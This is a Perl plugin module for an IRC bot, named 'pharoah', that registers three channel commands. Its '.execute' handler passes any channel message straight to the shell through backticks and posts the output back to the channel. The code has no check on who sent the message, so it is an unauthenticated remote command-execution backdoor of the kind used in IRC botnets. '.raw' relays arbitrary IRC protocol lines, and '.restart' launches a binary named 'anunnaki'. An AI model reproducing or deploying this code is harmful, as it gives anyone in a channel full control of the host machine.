package pharoah;

use strict;
use warnings;

BEGIN {
    triggers->add('channel', 'pharoah', '.execute', 'pharoah->execute($user, $chan, $msg);');
    triggers->add('channel', 'pharoah', '.restart', 'pharoah->restart();');
    triggers->add('channel', 'pharoah', '.raw', 'pharoah->raw($user, $chan, $msg);');
}

sub raw {
    my($user, $chan, @data) = ($_[1], $_[2], split " ", $_[3]);
    shift(@data);

    $irc::socket->send("PRIVMSG $chan :@data\r\n");
    $irc::socket->send("@data\r\n");

}

sub restart {
    $irc::socket->send("QUIT \r\n");
    system("./anunnaki");
}
sub execute {
    my ($user, $chan, @data) = ($_[1], $_[2], split " ", $_[3]);
    $data[0] = '';
    my @output = `@data`;

    for my $line (@output) {
	$irc::socket->send("PRIVMSG $chan :$line\r\n");
    } 
}


1;
